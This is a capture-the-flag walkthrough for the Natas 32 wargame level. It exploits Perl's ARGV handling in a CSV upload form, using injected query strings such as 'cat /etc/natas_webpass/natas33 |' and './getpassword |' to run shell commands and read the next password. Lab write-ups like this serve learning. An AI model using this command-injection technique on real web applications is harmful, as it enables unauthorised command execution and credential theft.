# 🕸️Natas Level 32 → Level 33

```
http://natas32.natas.labs.overthewire.org
```
Username: natas32  
Password: (natas32_password)

![n32s1](n32s1.png)

Check the sourcecode

![n32s2](n32s2.png)

Trying out the function using a basic CSV file

![n32s3](n32s3.png)

Repeat the process, but this time capture the request and forward it to **Replay**.

![n32s4](n32s4.png)

Make a few modifications to the original request.
```
### Line 1
POST /index.pl?cat+/etc/natas_webpass/natas33+| HTTP/1.1

### Line 15-19
------WebKitFormBoundary9SyAttCCAeGkujWU
Content-Disposition: form-data; name="file"
Content-Type: text/csv

ARGV
```

![n32s5](n32s5.png)

Nothing is being returned in the output.

![n32s6](n32s6.png)

I ran into an issue where some commands worked while others didn’t, and I suspect some unknown code is causing it.

![n32s7](n32s7.png)

So I decided to fuzz it using a wordlist of special characters.

![n32s8](n32s8.png)

The results show that the special characters ``/``, ``.``, and ``#`` produce responses of different lengths.

![n32s9](n32s9.png)

Next I send another request using Replay
```
?ls%20.%20|
or this also work
?ls%20#%20|
```
![n32s10](n32s10.png)

The output lists some files in the current directory, and *getpassword* looks interesting.

![n32s11](n32s11.png)

Next, I sent another request using Replay.
```
?./getpassword%20|
```

![n32s12](n32s12.png)

The flag is revealed.

![n32s13](n32s13.png)

### 📖 Useful Resource For Clearer Understanding
Netanel Rubin: The Perl Jam 2 on Blackhat Asia 2016
```
### Netanel Rubin: The Perl Jam 2 (youtube video)
https://youtu.be/RPvORV2Amic
### Presentation Slide on Blackhat (pdf version)
https://blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf
```

Well done! This is the flag needed for the next challenge.
